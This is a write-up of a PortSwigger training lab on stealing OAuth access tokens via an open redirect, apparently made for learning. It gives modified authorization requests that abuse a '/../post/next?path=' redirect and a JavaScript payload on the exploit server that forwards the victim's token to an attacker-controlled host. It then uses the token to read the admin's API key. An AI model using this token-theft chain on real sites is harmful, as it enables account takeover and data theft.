# Stealing OAuth access tokens via an open redirect

## This lab uses an [OAuth](https://portswigger.net/web-security/oauth) service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

## To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.

#### Note

##### You cannot access the admin's API key by simply logging in to their account on the client application.

## The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

## You can log in via your own social media account using the following credentials: `wiener:peter`.

---

step 1

![](images/lab4_http_history_redirect_uri.jpg)

step 2

logout and login again and see HTTP history

![](images/lab4_http_history_redirect_uri_access_token.jpg)

step 3
send step 2 to repeater
change uri with google.com

![](images/lab4_change_uri_bad_request.jpg)

step 4
in uri section test with /../post?/postId=8
it give 302 response
![](images/lab4_uri_test_post_id.jpg)

step 5
Note in this lab if you logout and login again you don't need to enter user-id and password
it will automatically login

now logout and click on my account and intercept process until you reach at redirect_uri
![](images/lab4_social_login_uri.jpg)

step 6

add /../

```javascript
GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/../post?postId=8&response_type=token&nonce=-2006832369&scope=openid%20profile%20email HTTP/2
```

![](images/lab4_intercept_uri.jpg)

you will redirect to post 8

![](images/lab4_after_forward_access_token_with_postid.jpg)

this is complete url

```http
https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/post?postId=8#access_token=pDuxx3Zrg65Yue-6vKm6ShYqwSSLiVdm-_1Y7ZnTnH-&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

step 7

in the post in the bottom section there is next button

![](images/lab4_next_post_link_at_bottom_of_post.jpg)

click on next

it will redirect to next post
earlier it was 8 not it is 9
![](images/lab4_post_id_9.jpg)

step 8

go to HTTP history again find next url

![](images/lab4_next_path_url_302__found.jpg)

step 8
send step 7 to repeater and path= https://google.com

```
GET /post/next?path=https://google.com HTTP/2
```

you will get 302 response

![](images/lab4_change_next_path_url_add_google_url.jpg)

step 9
now click on my account
intercept request keep forward until you reach redirect_uri

```
GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback&response_type=token&nonce=794310292&scope=openid%20profile%20email HTTP/2
```

change to

```javascript
GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/../post/next?path=https://google.com&response_type=token&nonce=794310292&scope=openid%20profile%20email HTTP/2
```

![](images/lab4_redirect_google_with_access_token.jpg)

---

step 10

now exploit it
add payload to exploit

```javascript
<script>window.location = '/?'+document.location.hash.substr(1)</script>
```

![](images/lab4_add_first_payload.jpg)
and in uri section add `/../post/next?path=https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit`

```
GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/..&response_type=token&nonce=599160809&scope=openid%20profile%20email
```

change to

```javascript
GET /auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit&response_type=token&nonce=599160809&scope=openid%20profile%20email
```

![](images/lab4_forward_path_id_uri_intercept.jpg)

it will redirect to exploit url

![](images/lab4_access_token_exploit_web_page.jpg)

copy url from browser for access_token

```
https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/?access_token=M12aNQq8S1W7vYy5iibr7qzN4LfbBhAyIdvZ41tG9m_&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

or
click on access log for token

![](images/lab4_access_log_access+token.jpg)

```
access_token=M12aNQq8S1W7vYy5iibr7qzN4LfbBhAyIdvZ41tG9m_
```

---

step 11
go to HTTP history click on me you will see api-key of user

![](images/lab4_http_history_me_request.jpg)

now send to the repeater use token key `M12aNQq8S1W7vYy5iibr7qzN4LfbBhAyIdvZ41tG9m_` from **\_\_\_\_**

step 10

![](images/lab4_change_token_to_get_user_api_key.jpg)

---

step 12

payload HInt

### Hint:

```javascript
<script>
  if (!document.location.hash){" "}
  {
    (window.location =
      "https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email")
  }{" "}
  else {(window.location = "/?" + document.location.hash.substr(1))}
</script>
```

change with your credential

```
outhid: oauth-0a29002603866278807a2f7b02c70094.oauth-server.net
labid: 0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net
exploitid: exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit/
```

final payload

```javascript
<script>
  if (!document.location.hash){" "}
  {
    (window.location =
      "https://oauth-0a29002603866278807a2f7b02c70094.oauth-server.net/auth?client_id=osyrq3sa4s28ka19xiyiz&redirect_uri=https://0a8a00d9039c628e80a2315a00d200c8.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email")
  }{" "}
  else {(window.location = "/?" + document.location.hash.substr(1))}
</script>
```

![](images/lab4_add_payload_exploit.jpg)

---

step 13
go to my account intercept again till uri

add and forward request

```
/../post/next?path=https://exploit-0a7e00fc032862b880fc303d0192000d.exploit-server.net/exploit
```

![](images/lab4_test_post_id_path_redirect_uri.jpg)

you will redirect to exploit page go to access log see if any different ip which contain access token

![](images/lab4_access_token_with_different_api_key.jpg)

copy token and paste to repeater at /me in authorization section

![](images/lab4_admin_api_key.jpg)

```json
{
  "sub": "administrator",
  "apikey": "8D2JdRgR7VEp54s32CHR60k1Z3VK5IYy",
  "name": "Administrator",
  "email": "administrator@normal-user.net",
  "email_verified": true
}
```

---

step 14
submit api-key to solve lab

![](images/lab4_lab_solved.jpg)
